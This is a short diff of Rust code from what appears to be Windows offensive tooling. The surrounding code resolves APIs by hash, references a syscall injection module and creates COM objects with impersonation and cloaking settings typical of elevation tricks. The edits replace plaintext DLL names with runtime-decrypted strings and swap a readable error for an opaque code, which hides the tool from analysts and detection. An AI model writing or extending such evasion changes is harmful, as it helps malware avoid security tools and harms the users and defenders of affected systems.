@@ -86,17 +86,17 @@ unsafe fn resolve_fn_by_hash(module_hash: u32, export_hash: u32) -> *mut u8 {
         None => return std::ptr::null_mut(),
     };
     // Build a temporary null-terminated byte string for LoadLibraryA from the
-    // known DLL names via a static dispatch on module_hash.
-    let dll_cstr: &[u8] = if module_hash == H_OLE32 {
-        b"ole32.dll\0"
+    // known DLL names via a static dispatch on module_hash (decrypted at runtime).
+    let dll_name: Vec<u8> = if module_hash == H_OLE32 {
+        let mut v = crate::encrypted::s_det_ole32().into_bytes(); v.push(0); v
     } else if module_hash == H_OLEAUT32 {
-        b"oleaut32.dll\0"
+        let mut v = crate::encrypted::s_det_oleaut32().into_bytes(); v.push(0); v
     } else if module_hash == H_ADVAPI32 {
-        b"advapi32.dll\0"
+        let mut v = crate::encrypted::s_det_advapi32().into_bytes(); v.push(0); v
     } else {
         return std::ptr::null_mut();
     };
-    let hmod = ll(dll_cstr.as_ptr() as *const i8);
+    let hmod = ll(dll_name.as_ptr() as *const i8);
     if hmod.is_null() { return std::ptr::null_mut(); }
     inject::syscall::resolve_export_by_hash(hmod, export_hash)
         .unwrap_or(std::ptr::null_mut())
@@ -279,7 +279,7 @@ unsafe fn try_one(clsid: &[u8], iid: &[u8], enc: &[u8], slots: &[usize]) -> Resu
     let hr = (api.co_create)(clsid.as_ptr() as *const c_void, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid.as_ptr() as *const c_void, &mut punk);
     if hr < 0 || punk.is_null() {
         (api.co_uninit)();
-        return Err(format!("CoCreate 0x{:08X}", hr as u32));
+        return Err(format!("e1:{:08X}", hr as u32));
     }
 
     let _ = (api.co_proxy)(punk, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, std::ptr::null(), 6, 3, std::ptr::null(), 0x40);
